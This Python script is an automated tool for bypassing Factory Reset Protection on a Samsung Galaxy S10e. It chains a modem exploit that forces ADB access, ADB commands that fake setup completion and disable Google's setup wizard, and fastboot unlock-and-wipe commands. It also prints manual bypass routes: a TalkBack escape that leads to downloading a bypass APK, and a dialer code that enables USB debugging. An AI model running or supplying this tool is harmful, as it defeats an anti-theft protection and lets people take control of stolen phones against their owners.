#!/usr/bin/env python3
"""
Automated Galaxy S10e FRP Bypass
Tries multiple methods automatically without user interaction
"""

import subprocess
import time
import sys
import os
from pathlib import Path

def progress(msg):
    print(f"[*] {msg}")

def run_adb_command(cmd, timeout=15):
    """Run ADB command with error handling"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.returncode == 0, result.stdout.strip(), result.stderr.strip()
    except subprocess.TimeoutExpired:
        return False, "", "Timeout"
    except Exception as e:
        return False, "", str(e)

def check_device_connected():
    """Check if any ADB device is connected"""
    success, output, _ = run_adb_command("adb devices")
    if success and "device" in output:
        lines = output.split('\n')[1:]  # Skip first line
        for line in lines:
            if 'device' in line and line.strip():
                return True, line.strip().split('\t')[0]
    return False, None

def force_adb_detection():
    """Try to force ADB detection using modem exploits"""
    progress("Trying to force ADB detection via modem...")
    
    # Import and use Samsung ADB enabler
    sys.path.insert(0, str(Path('.') / 'src'))
    try:
        from src.core.samsung_adb_enabler import SamsungADBEnabler
        enabler = SamsungADBEnabler()
        ports = enabler.get_samsung_modem_ports()
        
        if ports:
            progress(f"Found Samsung modem on {ports[0].device}")
            # Try all methods
            methods = [
                ("2024", enabler._method_2024),
                ("2022", enabler._method_aug2022_dec2022),
                ("Pre-2022", enabler._method_pre_aug2022)
            ]
            
            for name, method in methods:
                progress(f"Trying {name} method...")
                if method(ports[0].device, progress):
                    progress(f"{name} method completed")
                    time.sleep(10)  # Wait for ADB to appear
                    return True
    except Exception as e:
        progress(f"Modem exploit failed: {e}")
    
    return False

def try_direct_bypass_commands():
    """Try direct bypass commands if ADB is available"""
    progress("Checking for ADB access...")
    
    connected, device_id = check_device_connected()
    if not connected:
        return False
    
    progress(f"Device found: {device_id}")
    progress("Running FRP bypass commands...")
    
    commands = [
        "adb shell settings put secure user_setup_complete 1",
        "adb shell settings put global device_provisioned 1", 
        "adb shell pm clear com.google.android.setupwizard",
        "adb shell pm disable com.google.android.setupwizard",
        "adb shell am start -n com.android.settings/.Settings",
        "adb shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1",
        "adb shell content insert --uri content://settings/global --bind name:s:device_provisioned --bind value:i:1",
        "adb reboot"
    ]
    
    success_count = 0
    for cmd in commands:
        success, _, _ = run_adb_command(cmd)
        if success:
            progress(f"✓ {cmd}")
            success_count += 1
        else:
            progress(f"✗ {cmd} failed")
        time.sleep(1)
    
    return success_count >= len(commands) // 2  # At least half succeeded

def try_download_mode_bypass():
    """Try bypass via download mode"""
    progress("Trying download mode bypass...")
    
    # Check for device in download mode
    success, output, _ = run_adb_command("fastboot devices")
    if success and output.strip():
        progress("Device found in download mode")
        
        commands = [
            "fastboot oem unlock",
            "fastboot format data",
            "fastboot format cache",
            "fastboot reboot"
        ]
        
        for cmd in commands:
            success, _, _ = run_adb_command(cmd)
            if success:
                progress(f"✓ {cmd}")
            else:
                progress(f"✗ {cmd} failed")
        
        return True
    
    return False

def try_samsung_account_method():
    """Instructions for Samsung account bypass"""
    progress("Samsung Account Bypass Instructions:")
    print("1. On Google verification screen, tap BACK")
    print("2. Connect to WiFi")
    print("3. Tap 'Samsung Account' instead of Google")
    print("4. Create new Samsung account (no verification needed)")
    print("5. Complete setup to bypass Google FRP")
    return False  # This requires manual action

def main():
    print("=" * 60)
    print("🤖 AUTOMATED GALAXY S10e FRP BYPASS")
    print("=" * 60)
    print()
    
    # Method 1: Try modem exploits first
    progress("METHOD 1: Modem Exploit + ADB")
    if force_adb_detection():
        if try_direct_bypass_commands():
            print("\n🎉 SUCCESS! FRP bypass completed via ADB!")
            print("Your device will reboot and should be accessible.")
            return True
    
    # Method 2: Check if ADB is already available
    progress("\nMETHOD 2: Direct ADB Access")
    if try_direct_bypass_commands():
        print("\n🎉 SUCCESS! FRP bypass completed!")
        return True
    
    # Method 3: Try download mode
    progress("\nMETHOD 3: Download Mode")
    if try_download_mode_bypass():
        print("\n🎉 SUCCESS! Bypass completed via download mode!")
        return True
    
    # Method 4: Provide manual instructions
    progress("\nMETHOD 4: Manual Instructions")
    print("\nSince automated methods failed, try these manual steps:")
    print("\n=== TALKBACK METHOD ===")
    print("1. On welcome screen, tap Accessibility > Enable TalkBack")
    print("2. Draw 'L' shape to open global menu")
    print("3. Select TalkBack Settings > Help & Feedback")
    print("4. Tap 'Get started with TalkBack'")
    print("5. Long press text > Web Search > Opens Chrome")
    print("6. In Chrome, go to: frpfile.com/bypass")
    print("7. Download and install FRP bypass APK")
    
    print("\n=== EMERGENCY CALL METHOD ===")
    print("1. Tap Emergency Call")
    print("2. Dial *#*#2846579#*#* (Project Menu)")
    print("3. Enable USB Debugging")
    print("4. Re-run this script")
    
    print("\n=== SAMSUNG ACCOUNT METHOD ===")
    try_samsung_account_method()
    
    print("\n❌ All automated methods failed.")
    print("You'll need to follow the manual instructions above.")
    print("Or search YouTube for 'Galaxy S10e FRP bypass 2024'")
    
    return False

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nBypass cancelled by user")
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")
        import traceback
        traceback.print_exc()
